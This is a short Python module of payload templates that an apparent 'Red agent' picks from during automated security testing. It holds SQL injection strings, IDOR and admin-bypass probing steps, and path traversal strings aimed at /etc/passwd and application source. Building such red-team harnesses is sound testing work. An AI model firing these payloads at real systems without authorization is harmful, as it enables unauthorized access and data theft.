"""Deterministic payload templates the Red agent can pick and adapt."""
PAYLOADS: dict[str, list[str]] = {
    "sqli": [
        "' OR 1=1--",
        "' OR '1'='1",
        "' UNION SELECT id, name FROM products--",
        "%' OR 1=1--",
    ],
    "idor": [
        "Log in as a normal user, then request the same resource with another id: /api/invoices/1, /2, /3 ...",
        "Try sequential ids on any /<resource>/{id} route and compare owners.",
    ],
    "admin_bypass": [
        "Log in as a normal user and call admin-looking routes (/api/admin/...) with that token.",
        "Try the admin route with no token, then with a normal user's token.",
    ],
    "path_traversal": [
        "../../../etc/passwd",
        "..%2f..%2f..%2fetc%2fpasswd",
        "....//....//app/main.py",
    ],
}


def get_payload_templates(vuln_class: str) -> list[str]:
    return PAYLOADS.get(vuln_class, [])
